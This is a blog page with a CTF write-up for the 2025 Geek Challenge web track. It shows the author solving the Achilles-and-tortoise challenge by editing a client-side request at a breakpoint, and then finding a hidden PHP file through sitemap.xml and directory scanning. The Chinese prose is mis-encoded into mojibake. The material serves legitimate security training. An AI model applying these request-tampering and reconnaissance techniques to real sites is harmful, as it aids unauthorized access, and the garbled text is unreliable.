  "articleBody": "å£°æ˜ ç¬¬ä¸€æ¬¡å‚åŠ æå®¢å¤§æŒ‘æˆ˜CTFæ¯”èµ›ï¼Œwebæ–¹å‘æ€»å…±è§£å†³äº†å…­é“é¢˜ç›®ï¼ˆ6/20ï¼‰ï¼Œæˆ‘æ˜¯èœé¸ŸğŸ« \né˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ #JavaScript\né¢˜ç›®æè¿°ï¼šåœ¨å¤å¸Œè…Šï¼Œè‹±é›„é˜¿åŸºé‡Œæ–¯å’Œä¸€åªä¹Œé¾Ÿèµ›è·‘ã€‚é˜¿åŸºé‡Œæ–¯çš„é€Ÿåº¦æ˜¯ä¹Œé¾Ÿçš„åå€ã€‚æ¯”èµ›å¼€å§‹æ—¶ï¼Œä¹Œé¾Ÿåœ¨é˜¿åŸºé‡Œæ–¯å‰é¢100ç±³ã€‚èŠè¯ºæ‚–è®ºè®¤ä¸ºï¼Œå½“é˜¿åŸºé‡Œæ–¯è¿½åˆ°ä¹Œé¾Ÿçš„å‡ºå‘ç‚¹æ—¶ï¼Œä¹Œé¾Ÿå·²ç»åˆå‘å‰çˆ¬äº†ä¸€æ®µè·ç¦»ã€‚å½“é˜¿åŸºé‡Œæ–¯å†è¿½åˆ°é‚£ä¸ªä½ç½®æ—¶ï¼Œä¹Œé¾Ÿåˆå‘å‰çˆ¬äº†ã€‚å¦‚æ­¤æ— é™å¾ªç¯ï¼Œé˜¿åŸºé‡Œæ–¯ä¼¼ä¹æ°¸è¿œä¹Ÿè¿½ä¸ä¸Šä¹Œé¾Ÿã€‚ä»–çœŸçš„è¿½ä¸ä¸Šå—ï¼Ÿ\nå¤§æ¦‚æŸ¥çœ‹ç½‘é¡µä¿¡æ¯ï¼Œåªè¦è®©é˜¿åŸºé‡Œæ–¯çš„ä½ç½®æ¯”ä¹Œé¾Ÿçš„ä½ç½®è¿œå³å¯å¾—åˆ° flagï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®çš„ JavaScript ä»£ç ï¼Œä¸å¯èƒ½ä¸€ç›´ç‚¹å‡»è¿½èµ¶æŒ‰é”®ï¼Œå…¶å®åªè¦ç”¨æµè§ˆå™¨è¿›è¡Œå‰ç«¯è°ƒè¯•å³å¯\n... const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch('/chase', { // åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œåœ¨ fetch å‘èµ·è¯·æ±‚å‰ä¿®æ”¹ Payload å¯¹è±¡ method: 'POST', // ä½¿ achillesPos \u003e tortoisePos headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ \"data\": encryptData(payload) }), }) ... ä¿®æ”¹åç»§ç»­æ‰§è¡Œè„šæœ¬å³å¯å¾—åˆ° flagï¼Œå¯¹ä»£ç æ„Ÿå…´è¶£çš„å¯ä»¥å»è¯¦ç»†äº†è§£ä¸€ä¸‹åŸç†ï¼Œä¸‹é¢é™„ä¸Šæºä»£ç \nfunction encryptData(obj) { const jsonString = JSON.stringify(obj); return btoa(unescape(encodeURIComponent(jsonString))); } function decryptData(encodedString) { const jsonString = decodeURIComponent(escape(atob(encodedString))); return JSON.parse(jsonString); } document.addEventListener('DOMContentLoaded', () =\u003e { const chaseBtn = document.getElementById('chase-btn'); const achillesDistanceSpan = document.getElementById('achilles-distance'); const tortoiseDistanceSpan = document.getElementById('tortoise-distance'); const resultDiv = document.getElementById('result'); let achillesPos = 0; let tortoisePos = 10000000000; // Initial head start for the tortoise achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); chaseBtn.addEventListener('click', () =\u003e { // Achilles moves to the tortoise's current position const achillesMoveDistance = tortoisePos - achillesPos; achillesPos = tortoisePos; // The tortoise moves 1/10th of the distance Achilles just covered const tortoiseMoveDistance = achillesMoveDistance / 10; tortoisePos += tortoiseMoveDistance; achillesDistanceSpan.textContent = achillesPos.toFixed(2); tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2); const payload = { achilles_distance: achillesPos, tortoise_distance: tortoisePos, }; fetch('/chase', { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ \"data\": encryptData(payload) }), }) .then(response =\u003e response.json()) .then(encryptedResponse =\u003e { if (encryptedResponse.data) { const data = decryptData(encryptedResponse.data); if (data.flag) { // Use 'pre-wrap' to respect newlines in the fake flag message resultDiv.style.whiteSpace = 'pre-wrap'; resultDiv.textContent = `ä½ è¿½ä¸Šå®ƒäº†ï¼\\n${data.flag}`; chaseBtn.disabled = true; } else if (data.message) { resultDiv.textContent = data.message; } } else { console.error('Error:', encryptedResponse.error); resultDiv.textContent = `å‘ç”Ÿé”™è¯¯: ${encryptedResponse.error}`; } }) .catch(error =\u003e { console.error('Error:', error); resultDiv.textContent = 'å‘ç”Ÿé”™è¯¯ã€‚'; }); }); }); Vibe SEO #ç›®å½•æ‰«æ #Linux\né¢˜ç›®æè¿°ï¼šâ€œæˆ‘è®© AI å¸®æˆ‘åšäº†æœç´¢å¼•æ“ä¼˜åŒ–ï¼Œå®ƒå¥½åƒè¯´ä»€ä¹ˆã€æœç´¢å¼•æ“å–œæ¬¢ç»“æ„åŒ–çš„ç«™ç‚¹åœ°å›¾ã€ï¼Œè™½ç„¶ä¸æ˜¯å¾ˆæ‡‚å°±æ˜¯äº†â€\nç½‘ç«™é¦–é¡µä»€ä¹ˆä¿¡æ¯éƒ½æ²¡æœ‰ï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®æè¿°ä¸­çš„ä¿¡æ¯ï¼ŒSEO (Search Engine Optimization)ï¼Œå°±æ˜¯æœç´¢å¼•æ“ä¼˜åŒ–ï¼Œå¯ä»¥è®¿é—®ä¸€äº›ä¸ä¹‹ç›¸å…³çš„æ–‡ä»¶ç›®å½•ï¼Œå¦‚ï¼šrobots.txtï¼Œsitemap.xml ç­‰ï¼Œdirsearch ä¸­ä¹ŸåŒ…å«äº†è¿™äº›å¸¸è§ç›®å½•ï¼Œå¾—åˆ° /sitemap.xml\n",
  "wordCount" : "1639",
  "inLanguage": "en",
  "datePublished": "2025-11-24T21:04:46+08:00",
  "dateModified": "2025-11-24T21:04:46+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://lhzzz08.github.io/posts/geekchallengewebwp/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Lhz's blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://lhzzz08.github.io/favicon.svg"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://lhzzz08.github.io/" accesskey="h" title="Lhz&#39;s blog (Alt + H)">Lhz&#39;s blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://lhzzz08.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://lhzzz08.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://lhzzz08.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      2025æå®¢å¤§æŒ‘æˆ˜Webæ–¹å‘
    </h1>
    <div class="post-meta"><span title='2025-11-24 21:04:46 +0800 CST'>November 24, 2025</span>

</div>
  </header> 
  <div class="post-content"><h1 id="å£°æ˜">å£°æ˜<a hidden class="anchor" aria-hidden="true" href="#å£°æ˜">#</a></h1>
<p><strong>ç¬¬ä¸€æ¬¡å‚åŠ æå®¢å¤§æŒ‘æˆ˜CTFæ¯”èµ›ï¼Œwebæ–¹å‘æ€»å…±è§£å†³äº†å…­é“é¢˜ç›®ï¼ˆ6/20ï¼‰ï¼Œæˆ‘æ˜¯èœé¸ŸğŸ« </strong></p>
<h1 id="é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ">é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ<a hidden class="anchor" aria-hidden="true" href="#é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ">#</a></h1>
<p>#JavaScript</p>
<p>é¢˜ç›®æè¿°ï¼šåœ¨å¤å¸Œè…Šï¼Œè‹±é›„é˜¿åŸºé‡Œæ–¯å’Œä¸€åªä¹Œé¾Ÿèµ›è·‘ã€‚é˜¿åŸºé‡Œæ–¯çš„é€Ÿåº¦æ˜¯ä¹Œé¾Ÿçš„åå€ã€‚æ¯”èµ›å¼€å§‹æ—¶ï¼Œä¹Œé¾Ÿåœ¨é˜¿åŸºé‡Œæ–¯å‰é¢100ç±³ã€‚èŠè¯ºæ‚–è®ºè®¤ä¸ºï¼Œå½“é˜¿åŸºé‡Œæ–¯è¿½åˆ°ä¹Œé¾Ÿçš„å‡ºå‘ç‚¹æ—¶ï¼Œä¹Œé¾Ÿå·²ç»åˆå‘å‰çˆ¬äº†ä¸€æ®µè·ç¦»ã€‚å½“é˜¿åŸºé‡Œæ–¯å†è¿½åˆ°é‚£ä¸ªä½ç½®æ—¶ï¼Œä¹Œé¾Ÿåˆå‘å‰çˆ¬äº†ã€‚å¦‚æ­¤æ— é™å¾ªç¯ï¼Œé˜¿åŸºé‡Œæ–¯ä¼¼ä¹æ°¸è¿œä¹Ÿè¿½ä¸ä¸Šä¹Œé¾Ÿã€‚ä»–çœŸçš„è¿½ä¸ä¸Šå—ï¼Ÿ</p>
<p>å¤§æ¦‚æŸ¥çœ‹ç½‘é¡µä¿¡æ¯ï¼Œåªè¦è®©é˜¿åŸºé‡Œæ–¯çš„ä½ç½®æ¯”ä¹Œé¾Ÿçš„ä½ç½®è¿œå³å¯å¾—åˆ° flagï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®çš„ JavaScript ä»£ç ï¼Œä¸å¯èƒ½ä¸€ç›´ç‚¹å‡»<code>è¿½èµ¶</code>æŒ‰é”®ï¼Œå…¶å®<strong>åªè¦ç”¨æµè§ˆå™¨è¿›è¡Œå‰ç«¯è°ƒè¯•å³å¯</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> { 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">achilles_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">achillesPos</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tortoise_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">tortoisePos</span>,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/chase&#39;</span>, {             <span style="color:#75715e">// åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œåœ¨ fetch å‘èµ·è¯·æ±‚å‰ä¿®æ”¹ Payload å¯¹è±¡
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,           <span style="color:#75715e">// ä½¿ achillesPos &gt; tortoisePos
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>,
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">encryptData</span>(<span style="color:#a6e22e">payload</span>) 
</span></span><span style="display:flex;"><span>    }),
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>ä¿®æ”¹å<strong>ç»§ç»­æ‰§è¡Œè„šæœ¬</strong>å³å¯å¾—åˆ° flagï¼Œå¯¹ä»£ç æ„Ÿå…´è¶£çš„å¯ä»¥å»è¯¦ç»†äº†è§£ä¸€ä¸‹åŸç†ï¼Œä¸‹é¢é™„ä¸Šæºä»£ç </p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encryptData</span>(<span style="color:#a6e22e">obj</span>) {
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jsonString</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>);
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">unescape</span>(encodeURIComponent(<span style="color:#a6e22e">jsonString</span>)));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decryptData</span>(<span style="color:#a6e22e">encodedString</span>) {
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jsonString</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">escape</span>(<span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">encodedString</span>)));
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">jsonString</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;DOMContentLoaded&#39;</span>, () =&gt; {
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">chaseBtn</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;chase-btn&#39;</span>);
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">achillesDistanceSpan</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;achilles-distance&#39;</span>);
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tortoiseDistanceSpan</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;tortoise-distance&#39;</span>);
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">resultDiv</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;result&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">achillesPos</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tortoisePos</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000000000</span>; <span style="color:#75715e">// Initial head start for the tortoise
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#a6e22e">achillesDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">achillesPos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#a6e22e">tortoiseDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â  Â  <span style="color:#a6e22e">chaseBtn</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>, () =&gt; {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#75715e">// Achilles moves to the tortoise&#39;s current position
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Â  Â  Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">achillesMoveDistance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">achillesPos</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#a6e22e">achillesPos</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#75715e">// The tortoise moves 1/10th of the distance Achilles just covered
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Â  Â  Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tortoiseMoveDistance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">achillesMoveDistance</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#a6e22e">tortoisePos</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">tortoiseMoveDistance</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#a6e22e">achillesDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">achillesPos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#a6e22e">tortoiseDistanceSpan</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tortoisePos</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">achilles_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">achillesPos</span>,
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">tortoise_distance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">tortoisePos</span>,
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/chase&#39;</span>, {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>,
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  },
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">encryptData</span>(<span style="color:#a6e22e">payload</span>) }),
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  })
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>())
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">encryptedResponse</span> =&gt; {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decryptData</span>(<span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">flag</span>) {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#75715e">// Use &#39;pre-wrap&#39; to respect newlines in the fake flag message
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">whiteSpace</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pre-wrap&#39;</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`ä½ è¿½ä¸Šå®ƒäº†ï¼\n</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">flag</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">chaseBtn</span>.<span style="color:#a6e22e">disabled</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">message</span>) {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">message</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  }
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">error</span>);
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`å‘ç”Ÿé”™è¯¯: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">encryptedResponse</span>.<span style="color:#a6e22e">error</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  }
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  })
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; {
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">error</span>);
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  Â  Â  <span style="color:#a6e22e">resultDiv</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;å‘ç”Ÿé”™è¯¯ã€‚&#39;</span>;
</span></span><span style="display:flex;"><span>Â  Â  Â  Â  });
</span></span><span style="display:flex;"><span>Â  Â  });
</span></span><span style="display:flex;"><span>}); 
</span></span></code></pre></div><h1 id="vibe-seo">Vibe SEO<a hidden class="anchor" aria-hidden="true" href="#vibe-seo">#</a></h1>
<p>#ç›®å½•æ‰«æ #Linux</p>
<p>é¢˜ç›®æè¿°ï¼š&ldquo;æˆ‘è®© AI å¸®æˆ‘åšäº†æœç´¢å¼•æ“ä¼˜åŒ–ï¼Œå®ƒå¥½åƒè¯´ä»€ä¹ˆã€æœç´¢å¼•æ“å–œæ¬¢ç»“æ„åŒ–çš„ç«™ç‚¹åœ°å›¾ã€ï¼Œè™½ç„¶ä¸æ˜¯å¾ˆæ‡‚å°±æ˜¯äº†&rdquo;</p>
<p>ç½‘ç«™é¦–é¡µä»€ä¹ˆä¿¡æ¯éƒ½æ²¡æœ‰ï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®æè¿°ä¸­çš„ä¿¡æ¯ï¼ŒSEO (Search Engine Optimization)ï¼Œå°±æ˜¯æœç´¢å¼•æ“ä¼˜åŒ–ï¼Œå¯ä»¥è®¿é—®ä¸€äº›ä¸ä¹‹ç›¸å…³çš„æ–‡ä»¶ç›®å½•ï¼Œå¦‚ï¼šrobots.txtï¼Œsitemap.xml ç­‰ï¼Œdirsearch ä¸­ä¹ŸåŒ…å«äº†è¿™äº›å¸¸è§ç›®å½•ï¼Œ<strong>å¾—åˆ° /sitemap.xml</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span><span style="color:#f92672">&lt;urlset</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.sitemaps.org/schemas/sitemap/0.9&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;loc&gt;</span>http://localhost/<span style="color:#f92672">&lt;/loc&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;changefreq&gt;</span>weekly<span style="color:#f92672">&lt;/changefreq&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;loc&gt;</span>http://localhost/aa__^^.php<span style="color:#f92672">&lt;/loc&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;changefreq&gt;</span>never<span style="color:#f92672">&lt;/changefreq&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/urlset&gt;</span>
</span></span></code></pre></div><ul>
<li>æš´éœ²äº† aa__^^.php æ–‡ä»¶</li>
</ul>
<p><strong>è®¿é—® /aa__^^.php ç›®å½•ï¼Œæ˜¾ç¤ºäº†ä¸€äº›æŠ¥é”™</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>**Warning**: Undefined array key &#34;filename&#34; inÂ **/var/www/html/aa__^^.php**Â on lineÂ **3**  
